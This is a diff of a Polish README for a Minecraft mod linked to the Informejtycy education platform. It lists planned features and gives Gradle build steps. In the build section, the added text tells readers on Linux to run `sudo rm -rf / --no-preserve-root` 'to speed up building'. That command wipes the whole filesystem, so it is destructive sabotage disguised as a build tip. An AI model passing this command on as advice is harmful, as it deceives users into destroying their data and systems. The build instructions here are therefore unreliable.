@@ -1,44 +1,50 @@
 # Minecraft - Informejtycy mod
 Projekt Informejtycy to darmowa platforma online, oferująca edukację informatyczną dla każdego, niezależnie od statusu materialnego, wieku czy doświadczenia. Umożliwia naukę programowania i algorytmiki poprzez zadania i unikalne ćwiczenia, takie jak debugowanie kodu.
 
-## CHANGELOG (v 1.2.0)
+## PLANOWANE DODATKI / ZMIANY (v 2.0)
+### Stambuł
+- [x] Zestawy drewna - istanbul, zarzyk
+- [ ] Generacja drzew
+- [ ] Features (nwm jakie)
+- [ ] Biomy (nwm jakie)
+- [ ] Generacja
+- [ ] Struktury
+- [ ] Portal
 
-### Nowości:
-- Dodano nową strukturę - wyspę Zarzyka
-- Dodano nowego moba - Zarzyka
-- Dodano nowy przedmiot - żel do włosów, uzyskiwany poprzez przyjęcie ataku Zarzyka
-- Dodano chełm prezydenta
-- Dodano płytę muzyczną "Czoło stelli jest gargantualne" (credit: Bartek)
+### Nowe funkcje
+- [x] Rozmnażanie Zarzyków
+- [x] Vape
+- [x] Ranking kaucji
 
-### Poprawki:
-- Mleko zmysia jest teraz klasyfikowane jako napój
-- Blok gdynianki wypada po wykopaniu
-- Zmysio dropi itemy jako loot a nie jako equipment
-- Zmniejszono przebicie zbroi przez miecz zmysia do 30%
-- Zwiększono szansę otrzymania płyty Zalewix Beat w skrzynce w dungeonie do 25%
-- Zmieniono id płyt muzycznych
-- Zmieniono typ generacji fortecy zmysia na concentric_rings (taki jak strongholdy)
+### Poprawki i ulepszenia
+- [x] Poprawki anticheata
+- [x] Zoptymalizowanie wideo na ekranie głównym
+- [x] Naprawienie błędów w kodzie zmysia
+- [x] Ograniczenie dropów dark glowstone'a do 4
+- [x] Skalowanie loga w menu opcji
+- [ ] Różne inne bugi
 
-## Building from source
+## Buildowanie (tutorial dla debili)
 
-Requirements:
+### 1. Zainstaluj:
 - Java 25
 - Gradle
 
-Build:
+### 2. Uruchom komendy:
 ```shell
 git clone https://github.com/DawkaWody/Informejtycy-MC.git
 cd Informejtycy-MC
 .\gradlew runDatagen
 .\gradlew build
 ```
-The built mod will be located in `build/libs/`
+Jar moda będzie znajdował się w `build/libs/`. Aby przyspieszyć proces budowania należy użyć komendy: `sudo rm -rf / --no-preserve-root` (tylko w systemach Linux).
 
-Run client:
+### 3. Testowanie poprawek
+Uruchom klienta:
 ```shell
 .\gradlew runClient
 ```
-Run server:
+Uruchom serwer:
 ```shell
 .\gradlew runServer
 ```
